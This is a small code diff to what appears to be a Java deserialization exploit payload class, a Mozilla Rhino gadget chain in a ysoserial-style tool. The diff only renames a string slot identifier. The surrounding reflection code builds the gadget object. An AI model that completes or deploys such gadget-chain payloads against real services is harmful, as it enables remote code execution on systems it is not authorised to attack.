@@ -66,7 +66,7 @@ public class mozillarhino2 implements ObjectPayload<Object>{
         ScriptableObject initContextScriptableObject = new Environment();
         Method           makeSlot                    = ScriptableObject.class.getDeclaredMethod("accessSlot", String.class, int.class, int.class);
         Reflections.setAccessible(makeSlot);
-        Object slot = makeSlot.invoke(initContextScriptableObject, "nu1r", 0, 4);
+        Object slot = makeSlot.invoke(initContextScriptableObject, "QI4L", 0, 4);
         Reflections.setFieldValue(slot, "getter", initContextMemberBox);
 
         NativeJavaObject initContextNativeJavaObject = new NativeJavaObject();
